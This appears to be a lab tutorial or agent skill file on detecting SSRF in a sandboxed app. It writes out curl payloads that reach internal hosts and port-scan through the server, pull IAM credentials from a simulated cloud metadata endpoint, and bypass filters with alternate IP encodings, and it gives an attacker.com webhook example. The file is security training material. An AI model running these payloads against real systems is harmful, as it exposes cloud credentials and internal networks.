---
name: detecting-ssrf-vulnerabilities
description: >-
  Detect Server-Side Request Forgery (SSRF) vulnerabilities that allow attackers
  to make the server issue HTTP requests to internal or external resources.
  Covers basic SSRF detection, cloud metadata endpoint access, blind SSRF
  via out-of-band channels, and filter bypass techniques in safe lab environments.
domain: cybersecurity
subdomain: web-application-testing
tags: [ssrf, server-side-request-forgery, cloud-security, intermediate, owasp-a10, internal-network]
difficulty: intermediate
mitre_techniques: [T1190, T1590.004]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/ssrf-basics
---

> ⚠️ **Educational Use Only** — SSRF exploitation against cloud metadata endpoints or internal services on unauthorized systems can expose credentials and enable lateral movement. Practice only in provided isolated lab environments. Never test on AWS, GCP, or Azure instances you don't own.

## When to Use

- During authorized web app pentests when the application fetches URLs supplied by users (webhooks, image importers, URL previews, PDF generators)
- In CTF challenges involving internal network access or cloud metadata exfiltration
- When reviewing code that makes HTTP requests using user-controlled URLs
- As a prerequisite for understanding cloud security misconfigurations and IMDS (Instance Metadata Service) attacks
- When assessing WAF/filter effectiveness against SSRF bypass techniques

## Prerequisites

- **Knowledge:** Basic HTTP, what an IP address is, general understanding of cloud services
- **Lab:** `labs/web-application/ssrf-basics` — start with `agentlab start ssrf-basics`  
- **Difficulty:** Intermediate
- **Time:** 35–50 minutes

## Workflow

### Step 1: Start the Lab

```bash
agentlab start ssrf-basics
# App at http://localhost:8084
# Internal metadata service simulated at http://169.254.169.254 (inside lab network only)
# Internal admin panel at http://internal-admin:8090 (inside lab network only)
```

### Step 2: Identify SSRF Entry Points

Common SSRF-vulnerable features:
- **URL import/fetch:** `?url=https://example.com/image.jpg`
- **Webhook config:** `POST /webhooks {"callback_url": "https://attacker.com"}`
- **PDF generators:** `?render=https://internal/report`
- **Image proxy:** `/proxy?src=http://...`
- **XML imports with external entities (XXE → SSRF)**

```bash
# Find the fetch endpoint in the lab
curl "http://localhost:8084/fetch?url=http://example.com"
```

### Step 3: Test Basic SSRF — Internal Host Access

```bash
# Try to access an internal host not reachable from outside
curl "http://localhost:8084/fetch?url=http://127.0.0.1/"
curl "http://localhost:8084/fetch?url=http://localhost/"
curl "http://localhost:8084/fetch?url=http://internal-admin:8090/"

# Port scanning via SSRF — try common internal ports
for port in 22 80 443 3306 5432 6379 8080 8090; do
  echo -n "Port $port: "
  curl -s "http://localhost:8084/fetch?url=http://127.0.0.1:$port" | head -c 50
done
```

### Step 4: Cloud Metadata SSRF (Simulated)

The lab simulates the AWS EC2 IMDS (Instance Metadata Service) at `169.254.169.254`:

```bash
# Access simulated cloud metadata (lab-internal only)
curl "http://localhost:8084/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://localhost:8084/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://localhost:8084/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
# Returns simulated IAM credentials containing the flag
```

**In real authorized cloud pentests:** Accessing real IMDS exposes IAM credentials that could compromise the entire AWS account. This is why IMDS v2 (token-based) was introduced.

### Step 5: SSRF Filter Bypass Techniques

If the application blocks `127.0.0.1` or `localhost`:

```bash
# Alternative representations of 127.0.0.1
curl "http://localhost:8084/fetch?url=http://2130706433/"          # Decimal IP
curl "http://localhost:8084/fetch?url=http://0x7f000001/"          # Hex IP
curl "http://localhost:8084/fetch?url=http://0177.0.0.1/"          # Octal IP
curl "http://localhost:8084/fetch?url=http://[::1]/"               # IPv6 loopback
curl "http://localhost:8084/fetch?url=http://127.1/"               # Short form

# DNS rebinding (lab provides a simulated rebind domain)
curl "http://localhost:8084/fetch?url=http://ssrf-lab.internal/"
```

### Step 6: Blind SSRF Detection

When the server makes a request but doesn't return the response to you:

```bash
# The lab includes a built-in OAST (Out-of-Band) listener
# Use the lab's internal webhook.site equivalent
curl "http://localhost:8084/fetch?url=http://oast-listener:9001/callback"

# Check if request was received
agentlab logs ssrf-basics oast-listener
# Shows: GET /callback from 172.20.0.3 (the app server)
```

### Step 7: Capture the Flag

```bash
# The flag is in the simulated IAM credentials
curl "http://localhost:8084/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
# {"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"FLAG{ssrf_cloud_metadata_accessed}"}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| SSRF | Server-Side Request Forgery — making the server issue HTTP requests to attacker-controlled or internal targets |
| IMDS | Instance Metadata Service — cloud provider endpoint at 169.254.169.254 that exposes credentials and configuration |
| Blind SSRF | SSRF where the server makes the request but doesn't return the response — detected via OAST |
| OAST | Out-of-Band Application Security Testing — using an external listener to detect blind vulnerabilities |
| SSRF → RCE | SSRF that reaches internal services (Redis, Elasticsearch, Kubernetes API) can chain to remote code execution |
| T1590.004 | MITRE ATT&CK: Gather Victim Network Information — Network Topology |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `curl` | Manual SSRF testing | ✅ Pre-installed |
| Burp Collaborator | Blind SSRF detection via OAST | ⚠️ External (lab uses local alternative) |
| `ffuf` | SSRF port enumeration fuzzing | ✅ Pre-installed |

## Output / Verification

```bash
agentlab verify ssrf-basics "FLAG{ssrf_cloud_metadata_accessed}"
```

## Further Reading

- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
